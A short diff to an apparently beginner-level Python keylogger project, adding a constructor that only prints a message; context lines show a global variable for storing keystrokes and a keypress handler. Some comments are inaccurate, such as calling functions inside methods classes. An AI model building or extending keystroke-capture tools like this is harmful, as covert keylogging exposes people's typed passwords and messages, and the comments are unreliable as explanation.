@@ -9,6 +9,9 @@ import threading
 log = "" #init var for storing keystrokes
 
 class Keylogger: #class names start with capital letter conventionally
+    def __init__(self): #create constructor method
+        print("Constructor method")
+        #any code under here will automatically be executed
     def process_keypress(self, key): #functions inside methods are classes
         global log #to define global variables
         try:
